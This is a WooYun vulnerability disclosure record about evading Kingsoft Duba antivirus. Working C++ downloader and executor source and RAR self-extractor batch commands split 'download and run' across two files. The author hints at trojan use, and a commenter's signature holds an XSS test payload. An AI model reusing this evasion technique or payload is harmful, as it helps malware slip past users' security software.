{"id": 2668, "wybug_id": "wooyun-2014-058962", "wybug_title": "同样的方式再绕过金山新毒霸（悟空）", "wybug_corp": "金山毒霸", "wybug_author": "成王败寇", "wybug_date": "2014-04-30 11:32", "wybug_open_date": "2014-07-26 11:34", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["绕过", "免杀", "杀毒", "主动防御", "启发式", "金山毒霸"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向公众公开  简要描述： 之前绕过了百度杀毒，这次是金山新毒霸，后边还会有，这是个通病。。。。。。要是乌云能够在“问题厂商”里面给个多选的功能就好了，就不用每次都重新提交一个了。 详细说明：  以前给公司卖命的时候有N多漏洞不能公布分享，现在俺就一个人，也想来乌云添砖加瓦！启发式查杀和主动防御在不同的两个逻辑层面进行系统防护，但都依靠对恶意软件的恶意行为来进行查杀，如果恶意行为被分散在不同的逻辑层面上，将会令这两大防御功能同时失效。拿下载者为例，下载者的恶意特征就是“下载+执行”，大多数启发式杀毒只要看到山寨软件有这个行为就会报毒了，但如果我们把“下载+执行”分成两个文件会怎么样？DownFile.exe负责下载，ExecFile.exe负责把下载下来的东西跑起来，单独看两个文件都是没有恶意行为的，但它们配合到一起，嘿嘿。。。。。你懂的，两个文件配合的方式很多，利用bat、vbs、压缩包、系统回调等等想怎么玩都行。下面是实验过程细节：两个简单的测试程序代码：\n// DownFile.cpp : 负责下载一个exe程序，这里我用winrar的安装包替代，//文件很大演示的时候能看清步骤，如果是马的话瞬间就结束了。#include \"stdafx.h\"#include \"Wininet.h\"#pragma   comment(lib,   \"Wininet\")#define BUFLEN 16384int APIENTRY WinMain(HINSTANCE hInstance,                     HINSTANCE hPrevInstance,                     LPSTR     lpCmdLine,                     int       nCmdShow){ \t// TODO: Place code here.\tULONG dwFlags;\tInternetGetConnectedState(&dwFlags,0);\tHINTERNET hOpen;\tif (dwFlags & INTERNET_CONNECTION_PROXY)\t{\t\thOpen = InternetOpen(\"Microsoft Internet Explorer\",INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY,NULL,NULL,0);\t}\telse\t{\t\thOpen = InternetOpen(\"Microsoft Internet Explorer\",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);\t}\tif (!hOpen)\t{\t\tMessageBoxA(NULL,NULL,\"Internet 连接错误\",MB_OK);\t\treturn -1;\t}\tULONG dwSize;\tCHAR szHead[] = \"Accept: */* \\r\\n\\r\\n\";\tVOID * szTemp[BUFLEN];\tmemset(szTemp,0,BUFLEN);\tHINTERNET hConnect;\tif (!(hConnect = InternetOpenUrlA(hOpen,\"http://www.winrar.com.cn/download/wrar501sc.exe\",szHead,lstrlenA(szHead),INTERNET_FLAG_DONT_CACHE|INTERNET_FLAG_PRAGMA_NOCACHE\t\t|INTERNET_FLAG_RELOAD,0)))\t{\t\tMessageBoxA(NULL,NULL,\"URL出错\",MB_OK);\t\treturn -1;\t}\t\tHANDLE hFile = CreateFileA(\"whatsthis\",GENERIC_READ|GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);\tif (hFile == NULL)\t{\t\tMessageBoxA(NULL,NULL,\"创建文件出错\",MB_OK);\t\treturn -1;\t}\tULONG dwByteToRead = 0;\tULONG dwSizeOfRq = 4;\tULONG dwBytes = 0;\tif (!HttpQueryInfo(hConnect,HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER,(LPVOID)&dwByteToRead,&dwSizeOfRq,NULL))\t{\t\tdwByteToRead=0;\t}\tdo \t{\t\tif (!InternetReadFile(hConnect,szTemp,BUFLEN,&dwSize))\t\t{\t\t\tMessageBoxA(NULL,NULL,\"读网络文件出错\",MB_OK);\t\t\tCloseHandle(hFile);\t\t\treturn -1;\t\t}\t\tif (dwSize == 0)//下载完就退出循环\t\t{\t\t\tbreak;\t\t}\t\telse\t\t{\t\t\tDWORD lpNumberOfBytesWritten=0;\t\t\tif (!WriteFile(hFile,szTemp,dwSize,&lpNumberOfBytesWritten,NULL))\t\t\t{\t\t\t\tMessageBoxA(NULL,NULL,\"写文件出错\",MB_OK);\t\t\t}\t\t\tdwBytes+=dwSize;\t\t\t}\t\t\t} while (TRUE);\tCloseHandle(hFile);//普通下载者会想办法在一个程序里执行这一步骤\t\t//WinExec(\".\\\\whatsthis\",SW_SHOW);  \treturn 0;}// ExecFile.cpp :负责运行下载下来的“马”//#include \"stdafx.h\"int APIENTRY WinMain(HINSTANCE hInstance,                     HINSTANCE hPrevInstance,                     LPSTR     lpCmdLine,                     int       nCmdShow){ \t// TODO: Place code here.\tWinExec(\".\\\\whatsthis\",SW_SHOW);\treturn 0;}\n让两个程序配合起来这里我用的是rar自解压包的方式，懒得写程序了，rar是好东西！简单有效！自解压脚本命令如下：Setup=cmd /c echo DownFile.exe>e.batSetup=cmd /c echo ExecFile.exe>>e.batSetup=cmd /c e.batTempModeSilent=1上面这段解释一下，e.bat负责让两个文件配合起来，这里使用临时生成的方式，如果直接使用写好的e.bat还是会报，临时生成就不报了，这是很关键的一个步骤，这样杀软就无法将2个文件之间建立起联系，这也同样是利用了杀软的逻辑处理不当的问题。OK，压缩完包后拿去测试，整个过程毒霸都没报……剩下的一些细节，例如隐藏黑窗体、减小体积就靠大家自由发挥了，你们懂的。   漏洞证明：  整个过程已经录像存证。版本号为测试当天的最新版本，红色圆圈为生成好的下载者压缩包。\n\n运行压缩包下载者后，测试用的rar安装包被自动下载并且成功执行，整个过程新毒霸没有任何提示。\n\n   修复方案：  先把特征码加进去吧，然后建立多个文件之间关联分析模型，切断配合路径。   版权声明：转载请注明来源 成王败寇@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-26 11:34 厂商回复： 最终下载的若为恶意程序，防御仍然会拦截。不存在防御绕过 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-30 11:32 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  \"要是乌云能够在“问题厂商”里面给个多选的功能就好了，就不用每次都重新提交一个了。\"这个建议挺好的~    \n     2014-04-30 11:34 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @疯狗 是的。。。赞同，狗哥，顺便求审核    \n     2014-04-30 12:10 |    \t\t成王败寇 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 屌丝一枚)\t\t \n  @疯狗 提交漏洞厂商里面没有瑞星？是瑞星被屏蔽了吗？    \n     2014-04-30 13:32 |    \t\t小怿 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:6        | )\t\t \n  @成王败寇 瑞星的厂商名是RiSing    \n     2014-04-30 14:40 |    \t\t成王败寇 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 屌丝一枚)\t\t \n  @小怿 多谢，找了半天，我以为是中文的“瑞星”    \n     2014-05-01 10:41 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  我不和你们组团了 我走吊丝路去了 是不是五一没人审漏洞了  递交的真不是时候    \n     2014-05-01 10:45 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @疯狗 有安全软件异常信息其审核 @Mody  大五一的 让他们歇息三天把亲    \n     2014-05-01 23:44 |    \t\t丢小丢 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 爱好，只是单纯的爱好)\t\t \n  @abaddon 必须木有啊，我提交了过了1天没人理我呢,只好直接找厂商解决了    \n     2014-05-04 22:56 |    \t\tsoftbug \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | 为人类设计最好的软件，解放人的双手,一起...)\t\t \n  你来个360的试试    \n     2014-05-05 09:09 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @丢小丢 审核了 走了小厂商 不是悟空 呀:(    \n     2014-05-17 19:04 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个有试过下载其他远控什么的吗    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}